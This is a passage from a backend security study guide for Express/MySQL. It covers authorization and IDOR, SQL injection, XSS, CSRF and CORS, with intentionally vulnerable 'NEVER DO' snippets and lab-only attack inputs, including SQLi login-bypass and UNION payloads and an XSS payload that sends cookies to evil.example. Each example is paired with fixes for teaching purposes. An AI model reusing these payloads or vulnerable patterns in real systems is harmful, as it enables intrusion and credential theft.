### 4.3 Authentication vs authorization, and RBAC `[ESSENTIAL]`

**Concept**

- **Authentication (authn)**: who are you? (login, token verification) -> failure is `401 Unauthorized`.
- **Authorization (authz)**: what are you allowed to do? (roles, permissions, ownership) -> failure is `403 Forbidden` (or `404` when you do not want to reveal that a resource exists).

Airport analogy: passport check = authentication; boarding pass for *this* flight and lounge access = authorization.

**RBAC** (role-based access control): permissions are attached to roles (`user`, `manager`, `admin`); users get roles. It is simple and works for most business apps. More complex needs lead to permission-based checks, ABAC (attribute-based) or policy engines.

Authorization has three layers; interviews love this:

1. **Route-level**: is this role allowed to call this endpoint? (`requireRole('admin')`)
2. **Object-level (ownership)**: may *this user* access *this specific record*? (`WHERE id = ? AND user_id = ?`)
3. **Field-level**: may this user see/modify this field? (for example only admins may change `role`)

**Why it matters**

Broken access control is the number one category in the OWASP Top 10 (2021 edition), and "BOLA/IDOR" (broken object-level authorization) is number one in the OWASP API Security Top 10. Missing ownership checks cause more real breaches than exotic crypto bugs.

**Internal working**

Middleware chain: `authenticate` verifies the token and sets `req.user`; `requireRole`/`requirePermission` checks coarse permission; the handler (or service) checks ownership against the data. Authorization must be enforced on the server for every request; hiding a button in React is not security.

Role in the JWT: convenient, but stale until the token expires (a demoted admin keeps admin power for up to 15 minutes). For highly sensitive operations re-read the role from the database. That is a deliberate trade-off: stateless speed vs fresh permissions.

**Code example: RBAC middleware**

```js
// src/middleware/rbac.js
import { AppError } from '../errors.js';

// Coarse role check
export const requireRole = (...allowedRoles) => (req, res, next) => {
  if (!req.user) return next(new AppError(401, 'Authentication required', 'UNAUTHENTICATED'));
  if (!allowedRoles.includes(req.user.role)) {
    return next(new AppError(403, 'You do not have permission to do this', 'FORBIDDEN'));
  }
  next();
};

// Permission-based check: roles map to permissions; routes ask for a permission
const ROLE_PERMISSIONS = {
  user: new Set(['accounts:read:own', 'accounts:transfer:own']),
  manager: new Set(['accounts:read:own', 'accounts:transfer:own', 'users:read']),
  admin: new Set(['accounts:read:own', 'accounts:transfer:own', 'users:read', 'users:write', 'accounts:read:any']),
};

export const can = (role, permission) => ROLE_PERMISSIONS[role]?.has(permission) === true;

export const requirePermission = (permission) => (req, res, next) => {
  if (!req.user) return next(new AppError(401, 'Authentication required', 'UNAUTHENTICATED'));
  if (!can(req.user.role, permission)) {
    return next(new AppError(403, 'You do not have permission to do this', 'FORBIDDEN'));
  }
  next();
};
```

**Code example: using it, including ownership checks**

```js
// src/routes/admin.js
import { Router } from 'express';
import { pool } from '../db/mysql.js';
import { authenticate } from '../middleware/authenticate.js';
import { requireRole } from '../middleware/rbac.js';

export const adminRouter = Router();
adminRouter.use(authenticate, requireRole('admin')); // every route below needs an admin

adminRouter.get('/users', async (req, res) => {
  const limit = Math.min(Math.max(Number.parseInt(req.query.limit, 10) || 20, 1), 100);
  const [rows] = await pool.query(
    'SELECT id, email, role, created_at FROM users ORDER BY id LIMIT ?',
    [limit],
  );
  res.json({ data: rows });
});
```

```js
// src/routes/accounts.js (Day 4 version)
import { Router } from 'express';
import { z } from 'zod';
import { pool } from '../db/mysql.js';
import { AppError } from '../errors.js';
import { authenticate } from '../middleware/authenticate.js';
import { can } from '../middleware/rbac.js';
import { transferMoney } from '../services/accounts.js';

export const accountsRouter = Router();
accountsRouter.use(authenticate);

const idParam = z.coerce.number().int().positive();

accountsRouter.get('/:id', async (req, res) => {
  const id = idParam.parse(req.params.id);

  const [rows] = await pool.execute(
    'SELECT id, user_id, balance FROM accounts WHERE id = ?',
    [id],
  );
  const account = rows[0];

  const isOwner = account && account.user_id === req.user.id;
  const isStaff = can(req.user.role, 'accounts:read:any');

  // 404 (not 403) for other people's accounts: do not reveal that the id exists
  if (!account || !(isOwner || isStaff)) {
    throw new AppError(404, 'Account not found', 'NOT_FOUND');
  }
  res.json({ id: account.id, balance: account.balance });
});

const transferSchema = z.object({
  fromAccountId: z.number().int().positive(),
  toAccountId: z.number().int().positive(),
  amount: z.string().regex(/^\d{1,10}\.\d{2}$/),
}).strict();

accountsRouter.post('/transfers', async (req, res) => {
  const input = transferSchema.parse(req.body);

  // Object-level authorization: the SOURCE account must belong to the caller
  const [own] = await pool.execute(
    'SELECT id FROM accounts WHERE id = ? AND user_id = ?',
    [input.fromAccountId, req.user.id],
  );
  if (own.length === 0) throw new AppError(404, 'Account not found', 'NOT_FOUND');

  const result = await transferMoney(input);
  res.status(201).json(result);
});
```

**NEVER DO: missing ownership check (IDOR / BOLA)**

```js
// NEVER DO: any logged-in user can read ANY account by changing the id in the URL
accountsRouter.get('/unsafe/:id', async (req, res) => {
  const [rows] = await pool.execute('SELECT * FROM accounts WHERE id = ?', [req.params.id]);
  res.json(rows[0]); // authenticated, but never authorized for THIS record
});
```

The attacker logs in with their own account and simply calls `/accounts/1`, `/accounts/2`, `/accounts/3` and so on. The fix is the ownership check above (or putting `AND user_id = ?` into the query so a foreign record simply is not found). Using random UUIDs instead of sequential ids makes guessing harder, but it is *not* a replacement for an authorization check.

**Frontend connection**

React Router mein tum `<ProtectedRoute role="admin">` use karte ho taaki admin page sirf admin ko dikhe. Ye sirf UX hai: attacker browser DevTools ya `curl` se seedha `/admin/users` hit kar sakta hai. Asli rule server-side `requireRole` hai. Frontend role-check = "button hide karna", backend role-check = "darwaza lock karna".

**Real-world scenario**

Marketplace: buyer, seller and admin roles. A seller may edit only their own products (object-level), only an admin may suspend a seller (role), and only the finance role may see payout details (field-level). A bug where `PUT /products/:id` verified the role "seller" but not the product owner would let any seller edit competitors' prices. That is a BOLA bug, and it is the kind of scenario interviewers describe.

**Interview answer:**

"Authentication proves who the caller is; authorization decides what that caller may do. I return 401 when the identity is missing or invalid and 403 when it is valid but not permitted. I implement RBAC with an authenticate middleware that verifies the token and a requireRole or requirePermission middleware for route-level checks, and I add object-level checks in the query or service so users can only touch their own records, which prevents IDOR. All of it is enforced on the server; frontend checks are only for usability. For critical actions I re-read the role from the database because a role inside a JWT can be stale until the token expires."

**Follow-up questions**

1. *401 vs 403?* 401 means unauthenticated (no or bad credentials); 403 means authenticated but forbidden. For resources you do not want to reveal, return 404.
2. *What is IDOR/BOLA?* Accessing another user's object by changing an identifier because the server checks only that you are logged in, not that the object is yours.
3. *RBAC vs ABAC?* RBAC grants by role. ABAC decides from attributes (user department, resource owner, time, risk). ABAC is more flexible but more complex; policy engines such as OPA or CASL-style libraries implement it [ADVANCED].
4. *Where do you keep roles: token or DB?* Token for speed with a short TTL; DB lookup for sensitive operations or immediate effect.
5. *How do you protect against privilege escalation via mass assignment?* Whitelist fields (zod `.strict()`), and make role changes a separate admin-only endpoint.
6. *Should authorization live in the controller or the service layer?* Route-level checks in middleware; object-level checks close to the data access (service/query), so every caller of that service gets them.

**Common mistakes**

- Checking only authentication and forgetting ownership.
- Relying on the frontend to hide admin features.
- Trusting a `role` field sent in the request body.
- Authorization logic scattered across handlers with copy-paste differences.
- Returning 403 vs 404 inconsistently so attackers learn which ids exist.
- Never testing negative cases (user A calling user B's resource). Add these tests in Week 6.

**Revision notes**

- authn = 401; authz = 403 (or 404).
- Three layers: route role, object ownership, field level.
- IDOR/BOLA = missing ownership check; top real-world API bug.
- Roles in JWT are stale until expiry; re-check for sensitive actions.
- Authorization always on the server.

### Day 4 wrap-up

**Key concepts to remember**

- Sessions (server state, revocable) vs JWT (stateless, hard to revoke); hybrid is common.
- Access token: short, in memory. Refresh token: opaque, httpOnly cookie, hashed in DB, rotated, reuse detection revokes the family.
- Cookie flags: HttpOnly, Secure, SameSite, Path.
- 401 vs 403; RBAC middleware; ownership checks prevent IDOR/BOLA.
- Frontend: single-flight refresh, access token in memory.

**Five revision questions**

1. Why have both an access token and a refresh token?
2. What does refresh-token rotation protect against, and what happens on reuse?
3. Why is the refresh token stored as a hash and why is SHA-256 enough for it?
4. Explain 401 vs 403 and give an example of an IDOR bug and its fix.
5. When would you pick server-side sessions over JWT?

**One practical coding task**

Add `/auth/refresh`, `/auth/logout` and `/auth/logout-all` (requires `authenticate`) to the lab. Then write a script that logs in, refreshes twice in a row using the *same old cookie value* and shows that the second call fails and that the newest token also stops working (family revoked). This is part of `EX-JWT-01` and project Stage 4.

**Self-assessment checklist**

- [ ] I can draw the refresh rotation flow and explain reuse detection.
- [ ] I can explain every attribute of the refresh cookie.
- [ ] I can write `requireRole` and `requirePermission` middleware from memory.
- [ ] I can find and fix an IDOR bug in a given handler.
- [ ] I can compare sessions and JWT without saying "JWT is better".

---

## Day 5 - SQL injection, XSS, CSRF, CORS, rate limiting (and helmet)

**Time plan (about 2 hours):** 30 min SQL injection (attack + fix), 25 min XSS, 25 min CSRF, 20 min CORS, 15 min rate limiting + helmet, 5 min revision.

**Learning objectives**

- Demonstrate (in a safe local lab) how SQL injection works, and fix it with parameterized queries and allow-lists.
- Explain reflected, stored and DOM XSS, and the layers of defence: output encoding, Content-Security-Policy, httpOnly cookies, sanitization of allowed HTML.
- Explain CSRF precisely: why it works, when an API is vulnerable, and the main defences (SameSite, CSRF tokens, Origin checks, custom headers).
- Explain what CORS really is (a browser rule, not a server firewall), configure it with an allow-list, and avoid dangerous configurations.
- Add rate limiting and security headers (helmet) and explain the limits of in-memory limiting.

All "NEVER DO" snippets below are for understanding only. Run them only against your own local lab database, never against a real system.

### 5.1 SQL injection `[ESSENTIAL]`

**Concept**

SQL injection (SQLi) tab hota hai jab user ka input SQL statement ke *text* mein mil jata hai aur database use data ki jagah code samajh leta hai. Attacker query ka structure badal deta hai: login bypass, saara data read karna, data delete/modify karna.

**Why it matters**

SQLi has been in the OWASP Top 10 for over a decade ("Injection"). It is entirely preventable, which is exactly why interviewers expect you to know the fix cold. Impact is severe: full data breach.

**Internal working**

The database parses the final SQL text. If you build that text with string concatenation or template literals, whatever the user types becomes part of the text, including quotes and keywords. A parameterized query sends the SQL template and the values separately; the parser has already fixed the structure, so the values can never be interpreted as SQL.

**NEVER DO: concatenating user input into SQL**

```js
// NEVER DO -- vulnerable to SQL injection
app.get('/unsafe/users', async (req, res) => {
  const email = req.query.email;
  const [rows] = await pool.query(
    `SELECT id, email, role FROM users WHERE email = '${email}'`, // user text becomes SQL
  );
  res.json(rows);
});
```

Attack examples against that endpoint (lab only):

```text
GET /unsafe/users?email=' OR '1'='1
   SQL becomes: ... WHERE email = '' OR '1'='1'        -> returns every user

GET /unsafe/users?email=' UNION SELECT id, password_hash, role FROM users -- 
   SQL becomes: ... WHERE email = '' UNION SELECT id, password_hash, role FROM users -- '
   -> returns password hashes in the "email" column (data theft)
```

The same pattern in a login query is the classic bypass:

```js
// NEVER DO -- login bypass with:  email = admin@example.com' --   (comment removes the password check)
const [rows] = await pool.query(
  `SELECT * FROM users WHERE email = '${email}' AND password_hash = '${hash}'`,
);
```

Note: `mysql2` disables multiple statements by default (`multipleStatements: false`), so the textbook `'; DROP TABLE users; --` does not run in this setup, but the OR and UNION attacks above still work. Never enable `multipleStatements` just for convenience.

**FIXED: parameterized query**

```js
// SAFE -- values travel separately from the SQL text
app.get('/users', async (req, res) => {
  const email = z.string().trim().toLowerCase().email().max(254).parse(req.query.email);
  const [rows] = await pool.execute(
    'SELECT id, email, role FROM users WHERE email = ?',
    [email],
  );
  res.json(rows);
});
```

With the same malicious input `' OR '1'='1`, the database simply searches for a user whose email literally equals that weird string and finds none.

**NEVER DO: dynamic ORDER BY / column names from the client**

```js
// NEVER DO -- placeholders cannot be used for identifiers, so developers concatenate "just this once"
const [rows] = await pool.query(`SELECT id, email FROM users ORDER BY ${req.query.sort}`);
// attacker: ?sort=(SELECT SLEEP(5))   or a subquery that leaks data via timing or errors
```

**FIXED: allow-list**

```js
const SORTABLE = new Map([
  ['created', 'created_at'],
  ['email', 'email'],
]);

const column = SORTABLE.get(String(req.query.sort)) ?? 'created_at'; // unknown input -> default
const direction = req.query.dir === 'asc' ? 'ASC' : 'DESC';          // exactly two possible values
const [rows] = await pool.query(`SELECT id, email FROM users ORDER BY ${column} ${direction} LIMIT 50`);
```

Only strings *you wrote* reach the SQL text. The user chooses a key; you choose the SQL.

**LIKE searches**

```js
// Parameterize the pattern too. Escape % and _ if the user must not control wildcards.
const term = String(req.query.q ?? '').slice(0, 50).replace(/[\\%_]/g, '\\$&');
const [rows] = await pool.execute(
  'SELECT id, email FROM users WHERE email LIKE ? ORDER BY id LIMIT 20',
  [`%${term}%`],
);
```

(Wildcards in a LIKE value are not a SQL injection, but unescaped `%` can make queries slow; this is a denial-of-service concern.)

**Defence in depth (do these as well, not instead)**

1. **Least privilege**: the app's DB user gets only `SELECT, INSERT, UPDATE, DELETE` on its own schema. No `DROP`, no `FILE`, no admin rights, and never `root`. Run migrations with a different, more powerful user.
2. **Do not leak database errors** to clients (`err.sqlMessage` reveals table and column names); the central error handler returns a generic 500 and logs details server-side.
3. **Validate input** (type, length, format) at the boundary. Validation reduces risk, but it is not the primary defence: parameterization is.
4. **ORMs and query builders** parameterize by default, but their raw-SQL escape hatches are as dangerous as concatenation.
5. **Second-order SQLi**: data stored safely (parameterized insert) but later concatenated into another query. Always parameterize at *every* query.
6. WAFs and sanitizing functions (`replace("'", "''")`) are not substitutes; they are bypassable.

**Frontend connection**

Same idea as React escaping JSX expressions versus `dangerouslySetInnerHTML`: keep data and code separate. If you ever built a URL with string concatenation instead of `URLSearchParams`/`encodeURIComponent` you have already seen a smaller version of injection.

**Real-world scenario**

An internal reporting endpoint `GET /reports?sort=...` was built by a junior developer with a template literal. A security scanner found `sort=(SELECT SLEEP(10))` delaying the response. The fix took 10 minutes: allow-list for sort. The audit took days: checking logs to see whether anyone had exploited it earlier.

**Interview answer:**

"SQL injection happens when untrusted input is concatenated into SQL text, so the database treats data as code. The primary defence is parameterized queries or prepared statements, where the SQL structure and the values are sent separately. For things that cannot be parameters, such as column names in ORDER BY, I use an allow-list mapping. In addition I use a least-privilege database account, hide database error details from clients, and validate inputs. ORMs help only if I avoid their raw-query escape hatches with interpolated user input."

**Follow-up questions**

1. *Is escaping quotes enough?* No. Escaping is error-prone (character sets, numeric contexts without quotes, second-order injection). Parameterization is the reliable fix.
2. *Can you parameterize table names?* No; use an allow-list.
3. *Does an ORM prevent SQLi?* Normal ORM queries are parameterized; raw queries with string building are not.
4. *What is blind SQL injection?* The attacker does not see query output but infers data from response differences or timing (`SLEEP`). Same root cause, same fix.
5. *What does least privilege achieve here?* Even if an injection slips through, the attacker cannot drop tables or read other schemas.

**Common mistakes**

- "I validate on the frontend so it is safe."
- Using template literals in `pool.query`.
- Using `IN (${ids.join(',')})` with unvalidated ids.
- Showing `err.message` or the SQL text in API responses.
- Giving the application user full DBA rights.

**Revision notes**

- Parameterize every value; allow-list every identifier.
- Least-privilege DB user; hide DB errors.
- ORM raw escape hatches are still injection risks.
- Parameterization beats escaping and WAFs.

### 5.2 XSS (Cross-Site Scripting) `[ESSENTIAL]`

**Concept**

XSS tab hota hai jab attacker ka JavaScript victim ke browser mein *tumhari website ke origin* par chal jata hai. Phir wo script us user ki taraf se actions kar sakti hai: API calls, DOM read karna, keystrokes capture karna, aur agar token `localStorage` mein hai toh chura lena.

Types:

- **Reflected**: payload request mein aata hai (URL parameter) aur turant response HTML mein reflect hota hai.
- **Stored**: payload database mein save hota hai (comment, profile bio, product review) aur har viewer ko serve hota hai. Sabse dangerous.
- **DOM-based**: client-side JavaScript untrusted data ko `innerHTML`/`document.write` mein daal deta hai; server ka direct role nahi hota.

**Why it matters**

XSS is one of the most common web vulnerabilities, and it affects backend developers because the server decides how data is returned and which headers are set. It also connects to authentication: XSS is the main reason tokens are kept out of `localStorage`.

**Internal working**

The browser cannot tell "your" script from "injected" script when both appear in the HTML the server returned. The root cause is mixing untrusted data into HTML without *output encoding* for that context (HTML body, attribute, JavaScript, URL, CSS each need different encoding).

**NEVER DO: reflecting raw input into HTML**

```js
// NEVER DO -- reflected XSS
app.get('/unsafe/search', (req, res) => {
  res.send(`<h1>Results for ${req.query.q}</h1>`); // Content-Type: text/html, input unescaped
});
// attacker link:  /unsafe/search?q=<img src=x onerror="fetch('https://evil.example/c?d='+document.cookie)">
// the victim clicks it, the script runs on YOUR origin
```

**NEVER DO: storing user HTML and returning it unfiltered to be rendered**

```js
// NEVER DO -- stored XSS when a frontend later renders comment.body with innerHTML
app.post('/unsafe/comments', async (req, res) => {
  await pool.query(`INSERT INTO comments (body) VALUES ('${req.body.body}')`); // also SQL injection
  res.sendStatus(201);
});
// frontend: element.innerHTML = comment.body   <-- NEVER DO (React: dangerouslySetInnerHTML)
```

**FIXED: encode output, return JSON, and add headers**

```js
// src/utils/escapeHtml.js
const MAP = { '&': '&amp;', '<': '&lt;', '>': '&gt;', '"': '&quot;', "'": '&#39;' };
export const escapeHtml = (value) => String(value).replace(/[&<>"']/g, (c) => MAP[c]);
```

```js
// SAFE: server-rendered HTML must encode every untrusted value for the HTML context
import { escapeHtml } from '../utils/escapeHtml.js';

app.get('/search', (req, res) => {
  const q = String(req.query.q ?? '').slice(0, 100);
  res.type('html').send(`<h1>Results for ${escapeHtml(q)}</h1>`);
});

// SAFER for APIs: return JSON with the correct content type. The browser does not execute it as HTML.
app.get('/api/search', (req, res) => {
  res.json({ query: String(req.query.q ?? '').slice(0, 100) }); // Content-Type: application/json
});
```

Layers of defence:

1. **Output encoding by default**: use a templating engine or UI framework that escapes automatically (React escapes JSX text; Handlebars `{{x}}` escapes; `{{{x}}}` does not). Escape hatches (`dangerouslySetInnerHTML`, `innerHTML`, `v-html`, triple braces) are where XSS lives.
2. **Correct `Content-Type` and `X-Content-Type-Options: nosniff`** (helmet sets it) so JSON/text is not sniffed as HTML.
3. **Content-Security-Policy (CSP)**: a header telling the browser which script sources are allowed; blocks inline scripts and unknown origins, so even if an injection happens the script may not run. helmet ships a strict default policy for API responses; for real web pages tune it to your frontend.
4. **httpOnly cookies** so `document.cookie` cannot read the refresh token.
5. **If you must accept rich HTML** (CMS, comments with formatting), sanitize with an allow-list sanitizer (`sanitize-html` or DOMPurify on the client), never a hand-written regex.
6. **Validate input** (length, type) but do not rely on input filtering as the XSS fix: the correct control is output encoding at the point of use, because the same data may be used in several contexts.

**Frontend connection**

You know this one from React: `<div>{comment.body}</div>` is safe because React escapes; `<div dangerouslySetInnerHTML={{ __html: comment.body }} />` is the hole. Also `href={userUrl}` can run `javascript:` URLs, so validate URL schemes (`http`/`https`). Backend job: do not store or return markup you do not intend to be rendered, and send proper headers; frontend job: do not bypass escaping.

**Real-world scenario**

Marketplace product reviews: a seller injects `<script>` into a review title. Admin opens the moderation page which renders titles with `innerHTML`. The script runs with the admin's privileges and calls admin APIs (suspend competitors, export data). That chain (stored XSS -> admin session abuse) is why admin panels need the strongest CSP and why tokens must not sit in `localStorage`.

**Interview answer:**

"XSS lets an attacker run JavaScript in a victim's browser on my origin, either reflected through a URL, stored in my database, or DOM-based on the client. The core fix is context-aware output encoding, which frameworks like React do by default, so I avoid raw HTML sinks such as innerHTML and dangerouslySetInnerHTML. On the server I return correct content types, set a Content-Security-Policy and nosniff via helmet, keep refresh tokens in httpOnly cookies, and if I must allow HTML I sanitize it with an allow-list library. Input validation helps but output encoding is the primary defence."

**Follow-up questions**

1. *Does httpOnly stop XSS?* No. It stops the script from *reading* the cookie, but the script can still make authenticated requests as the user while the page is open. It reduces the damage, not the vulnerability.
2. *Stored vs reflected?* Stored persists in the database and hits every viewer; reflected needs the victim to open a crafted link.
3. *Does a JSON API have XSS?* A JSON response served as `application/json` with `nosniff` is not executed as HTML. The vulnerability appears when a client renders the data unsafely, or when the API returns HTML.
4. *What is CSP?* A response header that restricts which scripts, styles and connections the page may use, for example `script-src 'self'`. It is a second line of defence, not a substitute for encoding.
5. *Where would you sanitize: on input or on output?* Encode on output for the specific context. Sanitize on input only when you intentionally store allowed HTML, and still encode/sanitize defensively when rendering.

**Common mistakes**

- Believing "we use React so XSS is impossible" (escape hatches, `href`/`src` URLs, third-party scripts, server-rendered HTML).
- Home-made regex sanitizers (`replace(/<script>/g, '')` is trivially bypassed).
- Keeping JWTs in `localStorage`.
- Returning user content with `Content-Type: text/html`.
- Disabling CSP because "it broke the app".

**Revision notes**

- XSS = attacker script runs on your origin: reflected, stored, DOM.
- Fix: output encoding + safe sinks; CSP; nosniff; httpOnly cookies; allow-list sanitizer for rich text.
- httpOnly reduces token theft, does not prevent XSS.
- No regex sanitizers.

### 5.3 CSRF (Cross-Site Request Forgery) `[ESSENTIAL]`

**Concept**

CSRF mein attacker victim ke browser ko tumhari site par request bhejne par majboor karta hai, aur browser *automatically cookies attach kar deta hai*. Server ko lagta hai request logged-in user ne ki hai.

Attack flow:

```text
1. Victim is logged in to bank.example (session cookie in the browser).
2. Victim opens evil.example (another tab).
3. evil.example contains a hidden form that auto-submits:
     <form action="https://bank.example/transfer" method="POST"> ... </form>
4. Browser sends POST to bank.example WITH the bank's cookie.
5. Bank server sees a valid cookie and executes the transfer.
```

The attacker never sees the response and never steals the cookie; they only trigger a *state-changing action*.

**Why it matters**

Whenever authentication uses cookies (sessions, or a refresh cookie like ours), CSRF must be considered. Interviewers test whether you know *when* it applies and why Bearer-token APIs are different.

**Internal working: when is an API vulnerable?**

- **Vulnerable**: authentication that the browser attaches automatically (cookies, HTTP Basic) and a state-changing endpoint that accepts a request which a cross-site form or simple request can produce.
- **Not vulnerable (to classic CSRF)**: authentication via `Authorization: Bearer` header set by your JavaScript, because a foreign site cannot make the browser add that header. (XSS is then the bigger risk.)
- Modern browsers default cookies without a `SameSite` attribute to `Lax`, which blocks cross-site POSTs. Do not rely on defaults and do not assume old browsers or embedded webviews behave the same: set the attribute explicitly.

Defences, strongest first for cookie-authenticated endpoints:

1. **`SameSite=Strict` or `Lax` cookies** -- the browser withholds the cookie on cross-site requests. Our refresh cookie already uses `Strict`.
2. **CSRF tokens**: synchronizer token (server stores a random token in the session and requires it in a header/form field) or *double-submit cookie* (random token in a cookie and in a header, signed/HMAC-bound to the session). An attacker's page cannot read the token because of the same-origin policy.
3. **Origin / Referer verification**: reject state-changing requests whose `Origin` header is not on your allow-list. Browsers always send `Origin` on cross-origin POSTs.
4. **Custom header requirement**: require a header such as `X-Requested-With` on mutating requests. A cross-site form cannot set custom headers, and a cross-site `fetch` with a custom header triggers a CORS preflight which your server refuses.
5. **Never mutate state on GET** (a GET is trivially triggered by an `<img src>`).
6. **Re-authentication or confirmation** for very sensitive actions.

Note: `csurf` (the old Express middleware) is deprecated and archived; use maintained alternatives (for example `csrf-csrf`) or the Origin/SameSite approach.

**Code example: Origin check middleware**

```js
// src/middleware/security.js
import { AppError } from '../errors.js';
import { config } from '../config.js';

const SAFE_METHODS = new Set(['GET', 'HEAD', 'OPTIONS']);
const allowedOrigins = new Set(config.corsOrigins);

// Use on cookie-authenticated, state-changing routes such as /auth/refresh and /auth/logout
export function requireTrustedOrigin(req, res, next) {
  if (SAFE_METHODS.has(req.method)) return next();

  const origin = req.get('origin');
  if (origin) {
    if (!allowedOrigins.has(origin)) {
      return next(new AppError(403, 'Untrusted origin', 'CSRF_ORIGIN'));
    }
    return next();
  }

  // No Origin header: non-browser client, or an old browser. Browsers also send Sec-Fetch-Site.
  if (req.get('sec-fetch-site') === 'cross-site') {
    return next(new AppError(403, 'Cross-site request blocked', 'CSRF_CROSS_SITE'));
  }
  return next();
}
```

Use it like this:

```js
authRouter.post('/refresh', requireTrustedOrigin, refreshHandler);
authRouter.post('/logout', requireTrustedOrigin, logoutHandler);
```

(A non-browser client without cookies is not a CSRF risk: CSRF only matters because browsers attach credentials automatically.)

**NEVER DO: cookie auth + state change on GET + no CSRF defence**

```js
// NEVER DO -- one <img src="https://bank.example/transfer?to=attacker&amount=5000"> and it executes
app.get('/transfer', cookieAuth, async (req, res) => {
  await transferMoney({ fromAccountId: req.user.accountId, toAccountId: req.query.to, amount: req.query.amount });
  res.send('done');
});
```

**Frontend connection**

Tumhara `fetch(url, { credentials: 'include' })` wahi switch hai jo browser ko cookies attach karne ko kehta hai; CSRF ka matlab hai ki *koi aur site bhi* browser ko yeh karwa sakti hai. Isliye cookie-based auth mein SameSite/Origin checks zaroori hain. Agar frontend Bearer token header manually set karta hai (axios interceptor), toh classic CSRF apply nahi hota.

**Real-world scenario**

Internet banking in 2010s: transfer form posted to `/transfer` using only the session cookie. Attacker email contained a page auto-submitting the form. Modern fix: SameSite cookies, per-session CSRF token, Origin validation, and an OTP for transfers above a threshold.

**Interview answer:**

"CSRF exploits the fact that browsers automatically attach cookies to requests, so a malicious site can make a victim's browser send a state-changing request to my API with the victim's credentials. It applies when authentication is cookie-based. I defend with SameSite cookies, verifying the Origin header on state-changing requests, and CSRF tokens such as a signed double-submit token where needed. I never change state on GET. If the API authenticates with an Authorization header that JavaScript sets, classic CSRF does not apply, though XSS then becomes the main concern."

**Follow-up questions**

1. *Does CORS protect against CSRF?* Not reliably. CORS controls whether a page may *read* a cross-origin response. "Simple" cross-site requests (form posts) are still *sent* and executed by the server; only the response is hidden. Preflighted requests are blocked, which is why a custom-header requirement helps.
2. *Why is a JWT in the Authorization header immune to CSRF?* The browser does not attach it automatically; only your script adds it, and another origin's script cannot read or use it.
3. *Difference between CSRF and XSS?* CSRF abuses the browser's automatic credential sending from another site, and the attacker cannot read responses. XSS runs the attacker's code inside your site, so it can read anything the user can. XSS defeats CSRF tokens.
4. *Is SameSite=Lax enough?* It blocks cross-site POST/PUT/DELETE, but allows top-level GET navigations, so GET must be safe. Also same-site (sibling subdomain) attacks are not covered; add Origin checks for sensitive endpoints.
5. *What is double-submit cookie?* The server sets a random token cookie and requires the same value in a request header; an attacker cannot read the cookie cross-site to copy it. Bind the token to the session (HMAC) so an attacker cannot plant their own cookie.

**Common mistakes**

- Thinking CORS configuration alone prevents CSRF.
- Using GET for state changes.
- Setting `SameSite=None` without any other CSRF defence.
- Confusing "no CSRF needed for Bearer tokens" with "no security needed".
- Putting the CSRF token in a cookie only (without requiring it in a header).

**Revision notes**

- CSRF = browser auto-attaches cookies; attacker triggers actions, cannot read responses.
- Applies to cookie auth; Bearer header auth is not affected.
- Defences: SameSite, Origin check, CSRF token, custom header, no state change on GET.
- CORS is not a CSRF defence.

### 5.4 CORS `[ESSENTIAL]`

(For request lifecycle debugging see Week 3 / Day 6 notes; this section is the security view.)

**Concept**

Browsers enforce the *same-origin policy*: a page from `https://app.example.com` cannot read responses from `https://api.example.com` (different origin: scheme + host + port) unless the API says so with CORS headers. CORS (Cross-Origin Resource Sharing) is the mechanism by which the *server relaxes* that restriction for chosen origins.

**Why it matters**

Everyone hits CORS errors in frontend work; the backend interview question is deeper: "Is CORS a security feature for the API?" Correct answer: it protects *users' browsers*, not your server.

**Internal working**

- **Simple requests** (GET/HEAD/POST with basic headers and content types like `application/x-www-form-urlencoded`): browser sends the request with `Origin`, server responds, and the browser decides whether JS may read the response based on `Access-Control-Allow-Origin`.
- **Preflighted requests** (JSON `Content-Type`, custom headers like `Authorization`, methods like PUT/DELETE): the browser first sends `OPTIONS` with `Access-Control-Request-Method` and `Access-Control-Request-Headers`; the real request is sent only if the server's preflight response allows it. Cache preflight with `Access-Control-Max-Age`.
- Credentialed requests (`credentials: 'include'`): server must respond with an *exact* origin (not `*`) and `Access-Control-Allow-Credentials: true`.
- CORS is enforced only by browsers. `curl`, Postman, mobile apps and other servers ignore it entirely, so it can never be your authentication or authorization.

**Code example**

```js
// src/middleware/security.js (continued)
import cors from 'cors';
import helmet from 'helmet';

export const corsMiddleware = cors({
  origin: config.corsOrigins,                 // exact allow-list, e.g. ['https://app.example.com']
  credentials: true,                          // allow cookies; requires non-wildcard origins
  methods: ['GET', 'POST', 'PUT', 'PATCH', 'DELETE'],
  allowedHeaders: ['Content-Type', 'Authorization'],
  maxAge: 600,                                // cache preflight for 10 minutes
});

export const securityHeaders = helmet();      // see 5.6
```

**NEVER DO: reflect any Origin with credentials**

```js
// NEVER DO -- any website can now read authenticated responses from your API
app.use((req, res, next) => {
  res.setHeader('Access-Control-Allow-Origin', req.get('origin')); // blindly reflects the caller
  res.setHeader('Access-Control-Allow-Credentials', 'true');
  next();
});
```

Why this is dangerous: a malicious page at `evil.example` runs `fetch('https://api.example.com/me', { credentials: 'include' })`; the victim's cookies are attached; your server answers with permissive CORS headers; the browser lets `evil.example` read the response. Browsers reject the combination `Access-Control-Allow-Origin: *` with credentials, which is exactly why developers "fix" it by reflecting the origin, which is worse. Use an explicit allow-list.

**Frontend connection**

Tum frontend mein dekhte ho "blocked by CORS policy" error aur proxy (Vite `server.proxy`) ya `mode: 'no-cors'` try karte ho. `no-cors` sirf response ko opaque banata hai, problem solve nahi karta. Sahi fix backend mein exact origin allow karna hai, ya dev mein proxy use karna taaki browser same-origin ko hi call kare.

**Real-world scenario**

Production: React app on `https://app.shop.com`, API on `https://api.shop.com`. The API allow-list contains only `https://app.shop.com` and the staging URL. The mobile app calls the API directly without CORS concerns, which is fine because CORS was never the access control; the API still requires valid tokens.

**Interview answer:**

"CORS is a browser mechanism that relaxes the same-origin policy: the server declares which origins may read its responses using headers such as Access-Control-Allow-Origin, and for non-simple requests the browser sends a preflight OPTIONS request first. It does not protect my server, because non-browser clients ignore it; it protects users' browsers from malicious sites reading authenticated responses. I configure an exact allow-list of origins, enable credentials only when needed, restrict methods and headers, and I never reflect arbitrary origins or combine a wildcard with credentials. Authentication and authorization are still enforced on the server."

**Follow-up questions**

1. *Why does Postman work when the browser shows a CORS error?* Postman is not a browser and does not enforce the same-origin policy.
2. *What is a preflight and when does it happen?* An automatic `OPTIONS` request before a "non-simple" cross-origin request, to check that the server allows the method and headers.
3. *Can `Access-Control-Allow-Origin: *` be used with cookies?* No; browsers reject it. Use an exact origin plus `Allow-Credentials: true`.
4. *Does CORS stop an attacker from sending requests to my API?* No. It limits which *browser pages* can read the responses. Requests may still be sent (see CSRF).
